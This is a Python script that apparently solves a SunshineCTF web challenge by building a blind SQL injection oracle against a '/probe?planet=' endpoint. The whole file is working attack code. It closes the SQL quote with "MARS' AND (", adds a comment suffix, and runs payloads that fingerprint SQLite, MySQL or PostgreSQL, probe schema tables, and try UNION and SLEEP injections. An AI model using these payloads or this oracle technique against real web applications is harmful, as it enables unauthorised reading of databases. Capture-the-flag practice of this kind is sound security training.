"""Planetary Probe — one-bit boolean oracle extractor.

The console answers GET /probe?planet=<x> with either class="is-carrier" (true)
or class="is-null" (false). The value is interpolated into a SQL WHERE clause.
"""
import sys
import time
import urllib.parse
import urllib.request

BASE = "https://planetary.web.2026.sunshinectf.games"
PREFIX = "MARS' AND ("
SUFFIX = ")-- -"
CACHE = {}


def ask(expr, suffix=SUFFIX):
    """Return True if the DB says 'signal detected' for MARS' AND (expr)."""
    url = BASE + "/probe?planet=" + urllib.parse.quote(PREFIX + expr + suffix, safe="")
    req = urllib.request.Request(url, headers={"User-Agent": "probe"})
    for _ in range(3):
        try:
            with urllib.request.urlopen(req, timeout=90) as r:
                body = r.read().decode("utf-8", "replace")
        except Exception as e:
            print("[!] retry after %s" % type(e).__name__, file=sys.stderr)
            time.sleep(1.5)
            continue
        if "is-carrier" in body:
            return True
        if "is-null" in body:
            return False
        raise SystemExit("[!] unexpected page")
    raise SystemExit("[!] target unreachable")


def raw(planet):
    url = BASE + "/probe?planet=" + urllib.parse.quote(planet, safe="")
    with urllib.request.urlopen(urllib.request.Request(url), timeout=90) as r:
        b = r.read().decode("utf-8", "replace")
    return "carrier" if "is-carrier" in b else "null"


if __name__ == "__main__":
    tests = [
        ("sanity true", "1=1"),
        ("sanity false", "1=2"),
        ("MARS exists", "1=1"),
        ("quote closed via -- -", "2>1"),
        ("sqlite_version like 3", "sqlite_version() LIKE '3%'"),
        ("mysql @@version", "@@version LIKE '%MySQL%'"),
        ("postgres version()", "version() LIKE '%PostgreSQL%'"),
        ("has sqlite_master", "(SELECT COUNT(*) FROM sqlite_master)>0"),
        ("has information_schema", "(SELECT COUNT(*) FROM information_schema.tables)>=0"),
        ("union 1 col", "1=2) UNION SELECT 'X'-- -"),
        ("sleep (mysql)", "1=2 AND SLEEP(0)"),
    ]
    for name, expr in tests:
        try:
            if name.startswith("union"):
                print("%-28s -> raw %s" % (name, raw("MARS' UNION SELECT 'X")))
            else:
                print("%-28s -> %s" % (name, ask(expr)))
        except SystemExit as e:
            print("%-28s -> ERR %s" % (name, e))
